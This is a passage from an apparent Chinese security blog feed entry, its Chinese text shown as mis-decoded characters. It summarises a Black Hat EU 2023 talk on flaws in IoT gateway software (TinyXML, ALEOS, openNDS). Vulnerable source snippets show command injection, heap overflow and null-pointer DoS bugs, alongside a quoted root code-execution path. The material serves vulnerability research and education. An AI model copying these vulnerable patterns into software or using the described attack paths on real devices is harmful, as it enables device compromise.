‡ï¼ˆäºŒè¿›åˆ¶ã€å¼€æºç»„ä»¶ç­‰ï¼‰è¿›è¡Œé™æ€ã€åŠ¨æ€åˆ†æ<ul><li>æ ¹æ® SCA åˆ†æçš„ç»“æœï¼ŒæŒ‘é€‰é«˜ä¼˜ç›®æ ‡å¼€å±•ç ”ç©¶<ul><li>å¯æš´éœ²åœ¨å…¬ç½‘çš„ ACEmanager</li><li>å¯é€šè¿‡ Telnet é…ç½®çš„ AT å‘½ä»¤æ¥å£</li><li>å¼€æºç»„ä»¶ï¼Œå°¤å…¶æ˜¯æ²¡æ€ä¹ˆçˆ†è¿‡æ¼æ´çš„ç»„ä»¶</li></ul></li><li>æåˆ°äº† SBoM / Software Bill of Materialsï¼Œå³è½¯ä»¶ç‰©æ–™æ¸…å•ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸º SCA çš„åˆ†æç»“æœï¼ˆä½†æ˜¯æ˜¯æ ‡å‡†åŒ–çš„æ•°æ®ï¼‰<ul><li>å…³äº SBoM çš„åº”ç”¨ï¼Œå¯ä»¥é˜…è¯» <a href="https://www.openeuler.org/zh/blog/robell/openEuler_SBOM_Practice.html" target="_blank" rel="noopener">åŸºäº SBOM çš„å¼€æºç¤¾åŒºè½¯ä»¶ä¾›åº”é“¾å®‰å…¨è§£å†³æ–¹æ¡ˆ</a></li></ul></li></ul></li></ul><h2 id="0x02-æ¼æ´æ¡ˆä¾‹"><a href="#0x02-æ¼æ´æ¡ˆä¾‹" class="headerlink" title="0x02. æ¼æ´æ¡ˆä¾‹"></a>0x02. æ¼æ´æ¡ˆä¾‹</h2><h3 id="2-1-TinyXML"><a href="#2-1-TinyXML" class="headerlink" title="2.1 TinyXML"></a>2.1 TinyXML</h3><p>TinyXML å·²ç»è¢« TinyXML-2 å–ä»£ï¼Œå‰è€…ä¸å†ç»´æŠ¤ï¼Œæ‰€ä»¥ä½œè€…é€‰æ‹©ç›´æ¥å¯¹ TinyXML è¿›è¡Œ Fuzzã€‚</p><h4 id="2-1-1-CVE-2021-42260-CVE-2023-40458"><a href="#2-1-1-CVE-2021-42260-CVE-2023-40458" class="headerlink" title="2.1.1 CVE-2021-42260 / CVE-2023-40458"></a>2.1.1 CVE-2021-42260 / CVE-2023-40458</h4><p>æŒ‡é’ˆ <code>p</code> æŒ‡å‘æ”»å‡»è€…å¯æ§çš„ XML ä»£ç ï¼Œå¦‚æœ <code>if ( *(p+1) &amp;&amp; *(p+2) )</code> æ£€æŸ¥ä¸è¿‡ï¼Œé‚£ä¹ˆ <code>p</code> ä¼šä¿æŒä¸å˜ï¼Œå¯ä»¥è§¦å‘æ­»å¾ªç¯ï¼Œå®ç° DoS æ”»å‡»ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( p &lt; now )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Treat p as unsigned, so we have a happy compiler.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* pU = (<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>*)p;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Code contributed by Fletcher Dunn: (modified by lee)</span></span><br><span class="line">    <span class="keyword">switch</span> (*pU) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> TIXML_UTF_LEAD_0:</span><br><span class="line">        <span class="keyword">if</span> ( encoding == TIXML_ENCODING_UTF8 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *(p+<span class="number">1</span>) &amp;&amp; *(p+<span class="number">2</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// In these cases, don't advance the column. These are</span></span><br><span class="line">                <span class="comment">// 0-width spaces.</span></span><br><span class="line">                <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==TIXML_UTF_LEAD_1 &amp;&amp; *(pU+<span class="number">2</span>)==TIXML_UTF_LEAD_2 )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==<span class="number">0xbf</span>U &amp;&amp; *(pU+<span class="number">2</span>)==<span class="number">0xbe</span>U )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==<span class="number">0xbf</span>U &amp;&amp; *(pU+<span class="number">2</span>)==<span class="number">0xbf</span>U )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    &#123; p +=<span class="number">3</span>; ++col; &#125;   <span class="comment">// A normal character.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ++p;</span><br><span class="line">            ++col;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-2-CVE-2023-34194-CVE-2023-40462"><a href="#2-1-2-CVE-2023-34194-CVE-2023-40462" class="headerlink" title="2.1.2 CVE-2023-34194 / CVE-2023-40462"></a>2.1.2 CVE-2023-34194 / CVE-2023-40462</h4><p>è§¦å‘ <code>assert</code> å®ç° DoS æ”»å‡»ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> TiXmlBase::StringEqual( <span class="keyword">const</span> <span class="keyword">char</span>* p,</span><br><span class="line">                             <span class="keyword">const</span> <span class="keyword">char</span>* tag,</span><br><span class="line">                             <span class="keyword">bool</span> ignoreCase,</span><br><span class="line">                             TiXmlEncoding encoding )</span><br><span class="line">&#123;</span><br><span class="line">    assert( p );</span><br><span class="line">    assert( tag );</span><br><span class="line">    <span class="keyword">if</span> ( !p || !*p )</span><br><span class="line">    &#123;</span><br><span class="line">        assert( <span class="number">0</span> );    <span class="comment">// assert</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-ALEOS"><a href="#2-2-ALEOS" class="headerlink" title="2.2 ALEOS"></a>2.2 ALEOS</h3><p>ALEOS å³ AirLink Enterprise Operating Systemï¼Œå¯ä»¥ç†è§£ä¸º IoT è®¾å¤‡çš„å®šåˆ¶ç³»ç»Ÿï¼ŒACEmanager ç­‰éƒ½è¿è¡Œåœ¨è¯¥ç³»ç»Ÿä¸Šã€‚è¿™é‡Œçš„æ¼æ´å®é™…ä¸Šæ˜¯è‡ªç ”ä»£ç çš„æ¼æ´ã€‚</p><h4 id="2-2-1-CVE-2023-40460"><a href="#2-2-1-CVE-2023-40460" class="headerlink" title="2.2.1 CVE-2023-40460"></a>2.2.1 CVE-2023-40460</h4><p>XML ä¸Šä¼  XSS æ¼æ´ï¼š</p><ul><li>å†…å®¹å‡ ä¹æ²¡æœ‰æ ¡éªŒ</li><li>æ‰©å±•åå¯ä»¥ä»»æ„æŒ‡å®š</li><li>é…åˆå¥‡æ€ªçš„è·¯å¾„å¤„ç†é€»è¾‘ï¼Œæœ€ç»ˆå¯ä»¥ä¸Šä¼  HTML å¹¶ä¸”å¯ä»¥é€šè¿‡ URL è®¿é—®</li></ul><p>å‰ææ¡ä»¶ï¼šéœ€è¦å…ˆç™»å½• ACEmanager å†å‘èµ·ä¸Šä¼ æ“ä½œã€‚</p><h4 id="2-2-2-CVE-2018-4063"><a href="#2-2-2-CVE-2018-4063" class="headerlink" title="2.2.2 CVE-2018-4063"></a>2.2.2 CVE-2018-4063</h4><p>è¿™æ˜¯ä½œè€…æåˆ°çš„ Cisco Talos å‘ç°çš„ä¸€ä¸ªæ¼æ´ï¼Œè¿™é‡Œç¬”è€…ç®€å•è¡¥å……ä¸€ä¸‹ï¼Œç»†èŠ‚å¯å‚è€ƒ <a href="https://talosintelligence.com/vulnerability_reports/TALOS-2018-0748" target="_blank" rel="noopener">TALOS-2018-0748</a>ã€‚</p><blockquote><p>When uploading template files, you can specify the name of the file that you are uploading. There are no restrictions in place that protect the files that are currently on the device, used for normal operation. If a file is uploaded with the same name of the file that already exists in the directory, then we inherit the permissions of that file. In this case, the files that exist in the directory that the template file is saved to are:</p><ul><li><code>fw_expected_rm.cgi</code></li><li><code>fw_status.cgi</code></li><li><code>fw_upload_init.cgi</code></li><li><code>fw_upload_init.sh</code></li><li><code>rm_switching_action.cgi</code></li></ul><p>These files all have executable permissions on the device. By uploading a small wrapper, we can upload arbitrary code to the device and run by simply navigating to the web page through the browser. Since ACEManager is running as <code>root</code> any executables run will be running also as <code>root</code>.</p></blockquote><p>å³ä¸Šä¼ åŒåæ–‡ä»¶è¦†ç›–åŸæœ‰æ–‡ä»¶ï¼Œå¯ä»¥ç»§æ‰¿åŸæœ‰æ–‡ä»¶çš„å¯æ‰§è¡Œæƒé™ï¼›è€Œé€šè¿‡æµè§ˆç‰¹å®šçš„ Web é¡µé¢ï¼Œå¯ä»¥è§¦å‘è¿™äº› cgi ä»£ç çš„æ‰§è¡Œï¼›æœ€ç»ˆå®ç° <code>root</code> æƒé™ä»£ç æ‰§è¡Œã€‚å¦å¤–ï¼Œè¿™ä¸ªä¹Ÿéœ€è¦å…ˆç™»å½• ACEmanager æ‰èƒ½å‘èµ·æ”»å‡»ã€‚</p><h3 id="2-3-ç¡¬ç¼–ç é—®é¢˜"><a href="#2-3-ç¡¬ç¼–ç é—®é¢˜" class="headerlink" title="2.3 ç¡¬ç¼–ç é—®é¢˜"></a>2.3 ç¡¬ç¼–ç é—®é¢˜</h3><ol><li>å†…ç½® TLS è¯ä¹¦å’Œç§é’¥ï¼ˆé»˜è®¤ä½¿ç”¨ï¼‰</li><li>è°ƒè¯• Shell root ç”¨æˆ·ç¡¬ç¼–ç å¯†ç  SHA512 å“ˆå¸Œå€¼ï¼ˆåŠŸèƒ½é»˜è®¤ç¦ç”¨ï¼‰</li></ol><h3 id="2-4-openNDS"><a href="#2-4-openNDS" class="headerlink" title="2.4 openNDS"></a>2.4 openNDS</h3><p>openNDSï¼ˆé OpenDNSï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„ Captive Portal ç»„ä»¶ï¼ˆåŸºäºå¦ä¸€ä¸ªå¼€æºç»„ä»¶ Nodogsplash è¿›è¡Œçš„åˆ†å‰å¼€å‘ï¼‰ï¼Œ<a href="https://opennds.readthedocs.io/en/stable/" target="_blank" rel="noopener">å®˜æ–¹ä»‹ç»</a>å¦‚ä¸‹ï¼š</p><blockquote><p>openNDS (open Network Demarcation Service) is a high performance, small footprint, Captive Portal. It provides a border control gateway between a public local area network and the Internet.</p></blockquote><p>Captive Portal åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­éå¸¸å¸¸è§ï¼Œæ¯”å¦‚è¿æ¥æœºåœº WiFi æ—¶å‡ºç°çš„è®¤è¯ç³»ç»Ÿï¼Œå°±æ˜¯ç±»ä¼¼ openNDS è¿™æ ·çš„ç»„ä»¶åœ¨å·¥ä½œã€‚</p><p>ä½œè€…åœ¨ç¡®è®¤æ‰€ä¾èµ–çš„ openNDS ç‰ˆæœ¬ä¹‹åï¼Œå»åˆ†æäº†æ­¤ç‰ˆæœ¬å·ä¹‹åæäº¤çš„ commitï¼ˆå› ä¸ºæ²¡æœ‰å…¬å¼€çš„ CVEï¼Œæ‰€ä»¥ç›´æ¥è·Ÿç€ Patch æ¥åˆ†æï¼‰ï¼Œå°è¯•æ ¹æ® commit æ¥å¯»æ‰¾æ¼æ´ï¼ˆæˆ–è€…æ²¡æœ‰è¡¥å®Œçš„åŒç±»æ¼æ´å˜ç§ï¼‰ã€‚</p><h4 id="2-4-1-CVE-2023-38320"><a href="#2-4-1-CVE-2023-38320" class="headerlink" title="2.4.1 CVE-2023-38320"></a>2.4.1 CVE-2023-38320</h4><p>å¦‚æœæ”¶åˆ°çš„ HTTP è¯·æ±‚ä¸å¸¦ User-Agent å­—æ®µï¼Œå¯ä»¥è§¦å‘ç©ºæŒ‡é’ˆå¼•ç”¨å®ç° DoSï¼ˆåœ¨ Patch <a href="https://github.com/openNDS/openNDS/commit/b97bf3566071a8176c6e1add9af9abbfa6d89173" target="_blank" rel="noopener">b97bf35</a> ä¸­å¯ä»¥çœ‹åˆ° <code>do_binauth</code> å¯¹åº”çš„ CVE ä¸º CVE-2023-38322ï¼Œæ­¤å¤–ä½œè€…è¿˜å‘ç°äº†ä¸€äº›å…¶ä»–ç©ºæŒ‡é’ˆå¼•ç”¨é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒ <a href="https://github.com/openNDS/openNDS/releases/tag/v10.1.2" target="_blank" rel="noopener">OpenNDS v10.1.2 release</a>ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">show_preauthpage</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">const</span> <span class="keyword">char</span> *query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s_config *config = config_get_config();</span><br><span class="line">    <span class="keyword">char</span> *msg;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *user_agent;</span><br><span class="line">    <span class="keyword">char</span> *enc_user_agent;</span><br><span class="line">    <span class="keyword">char</span> *preauthpath;</span><br><span class="line">    <span class="keyword">char</span> *cmd;</span><br><span class="line">    <span class="keyword">char</span> *enc_query;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MHD_Response</span> *<span class="title">response</span>;</span></span><br><span class="line">    preauthpath = safe_calloc(SMALL_BUF);</span><br><span class="line">    safe_asprintf(&amp;preauthpath, <span class="string">"/%s/"</span>, config-&gt;preauthdir);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(preauthpath, config-&gt;fas_path) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span> (preauthpath);</span><br><span class="line">        user_agent = safe_calloc(USER_AGENT);</span><br><span class="line">        enc_user_agent = safe_calloc(ENC_USER_AGENT);</span><br><span class="line"></span><br><span class="line">        MHD_get_connection_values(connection, MHD_HEADER_KIND, get_user_agent_callback, &amp;user_agent);</span><br><span class="line"></span><br><span class="line">        uh_urlencode(enc_user_agent, ENC_USER_AGENT, user_agent, <span class="built_in">strlen</span>(user_agent));  <span class="comment">// strlen(NULL)</span></span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-2-CVE-2023-38316"><a href="#2-4-2-CVE-2023-38316" class="headerlink" title="2.4.2 CVE-2023-38316"></a>2.4.2 CVE-2023-38316</h4><p>URL <code>unescape</code> å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> unescape(<span class="keyword">void</span> * cls, struct MHD_Connection *c, <span class="keyword">char</span> *src)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *unescapecmd;</span><br><span class="line">    <span class="keyword">char</span> *msg;</span><br><span class="line"></span><br><span class="line">    debug(LOG_DEBUG, <span class="string">"Escaped string=%s\n"</span>, src);</span><br><span class="line"></span><br><span class="line">    unescapecmd = safe_calloc(QUERYMAXLEN);</span><br><span class="line">    msg = safe_calloc(QUERYMAXLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘½ä»¤æ³¨å…¥</span></span><br><span class="line">    <span class="built_in">snprintf</span>(unescapecmd, QUERYMAXLEN, <span class="string">"/usr/lib/opennds/unescape.sh -url \"%s\""</span>, src);</span><br><span class="line">    debug(LOG_DEBUG, <span class="string">"unescapecmd=%s\n"</span>, unescapecmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (execute_ret_url_encoded(msg, <span class="keyword">sizeof</span>(msg) - <span class="number">1</span>, unescapecmd) == <span class="number">0</span>) &#123;</span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"Unescaped string=%s\n"</span>, msg);</span><br><span class="line">        <span class="built_in">strcpy</span>(src, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(unescapecmd);</span><br><span class="line">    <span class="built_in">free</span>(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>(src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-3-CVE-2023-41101-CVE-2023-40465"><a href="#2-4-3-CVE-2023-41101-CVE-2023-40465" class="headerlink" title="2.4.3 CVE-2023-41101 / CVE-2023-40465"></a>2.4.3 CVE-2023-41101 / CVE-2023-40465</h4><p><code>preauthenticated</code> å­˜åœ¨ Query String è§£æå †æº¢å‡ºæ¼æ´ï¼ˆè€ç‰ˆæœ¬æ˜¯æ ˆæº¢å‡ºæ¼æ´ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">preauthenticated</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">const</span> <span class="keyword">char</span> *url, t_client *client)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s_config *config = config_get_config();</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *host = config-&gt;gw_address;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *accept = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *redirect_url;</span><br><span class="line">    <span class="keyword">char</span> *query;</span><br><span class="line">    <span class="keyword">char</span> *querystr;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for preauthdir</span></span><br><span class="line">    <span class="keyword">if</span> (check_authdir_match(url, config-&gt;preauthdir)) &#123;</span><br><span class="line"></span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"preauthdir url detected: %s"</span>, url);</span><br><span class="line">        query = safe_calloc(QUERYMAXLEN);    <span class="comment">// #define QUERYMAXLEN 8192</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!query) &#123;</span><br><span class="line">            ret = send_error(connection, <span class="number">503</span>);</span><br><span class="line">            <span class="built_in">free</span>(query);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        get_query(connection, &amp;query, QUERYSEPARATOR);  <span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"preauthenticated: show_preauthpage [%s]"</span>, query);</span><br><span class="line">        ret = show_preauthpage(connection, query);</span><br><span class="line">        <span class="built_in">free</span>(query);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// save the query or empty string into **query.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_query</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">char</span> **query, <span class="keyword">const</span> <span class="keyword">char</span> *separator)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> element_counter;</span><br><span class="line">    <span class="keyword">char</span> **elements;</span><br><span class="line">    <span class="keyword">char</span> *query_str;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">collect_query</span> <span class="title">collect_query</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="comment">// length çš„é•¿åº¦ä¾èµ–äº URL Query String å†…å®¹</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; element_counter; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!elements[i])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        length += <span class="built_in">strlen</span>(elements[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) <span class="comment">// q=foo&amp;o=bar the '&amp;' need also some space</span></span><br><span class="line">            length++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; element_counter; i++) &#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="built_in">strncpy</span>(*query + j, elements[i], length - j);  <span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-4-Root"><a href="#2-4-4-Root" class="headerlink" title="2.4.4 Root"></a>2.4.4 Root</h4><p>ä½œè€…åˆ©ç”¨å‰é¢çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œé…åˆä¸€äº›å…¶ä»–æ¼æ´å®ç°äº†è®¾å¤‡ Rootã€‚</p><h2 id="0x03-HoneyPot"><a href="#0x03-HoneyPot" class="headerlink" title="0x03. HoneyPot"></a>0x03. HoneyPot</h2><p>æœ€åï¼Œä½œè€…æ­å»ºèœœç½æ”¶é›†äº†ä¸€æ³¢æ”»å‡»æ•°æ®ï¼šåœ¨å„ç§å„æ ·çš„æ”»å‡»æ•°æ®ä¸­å‘ç°äº†é’ˆå¯¹ Sierra Wireless AirLink Gateways çš„æ”»å‡»ï¼Œä½†æ˜¯æ˜¯ç›´æ¥ä½¿ç”¨çš„ Cisco Talos å…¬å¸ƒçš„ PoCï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨ 0day æˆ–å…¶ä»–æœªçŸ¥æ¼æ´ã€‚</p><h2 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04. å°ç»“"></a>0x04. å°ç»“</h2><p>é¦–å…ˆæ˜¯å­¦ä¹ ä½œè€…çš„ç ”ç©¶æ€è·¯ï¼Œå…¶æ¬¡æ˜¯äº†è§£ä¸€äº›å¸¸è§çš„æ¼æ´æ¨¡å¼ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/eu-23/briefings/schedule/index.html#old-code-dies-hard-finding-new-vulnerabilities-in-old-third-party-software-components-and-the-importance-of-having-sbom-for-iotot-devices-35349&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;strong&gt;Old code dies hard:&lt;/strong&gt; Finding new vulnerabilities in old third-party software components and the importance of having SBoM for IoT/OT devices&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Conferences" scheme="http://programlife.net/categories/Conferences/"/>
    
      <category term="BlackHat" scheme="http://programlife.net/categories/Conferences/BlackHat/"/>
    
    
      <category term="IoT" scheme="http://programlife.net/tags/IoT/"/>
    
      <category term="TinyXML" scheme="http://programlife.net/tags/TinyXML/"/>
    
      <category term="Captive Portal" scheme="http://programlife.net/tags/Captive-Portal/"/>
    
      <category term="openNDS" scheme="http://programlife.net/tags/openNDS/"/>
    
  </entry>
  
  <entry>
    <title>iOS è®¾å¤‡ GPS ä½ç½®æ¨¡æ‹Ÿ</title>
    <link href="http://programlife.net/2021/05/30/ios-device-gps-location-emulation/"/>
    <id>http://programlife.net/2021/05/30/ios-device-gps-location-emulation/</id>
    <published>2021-05-30T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
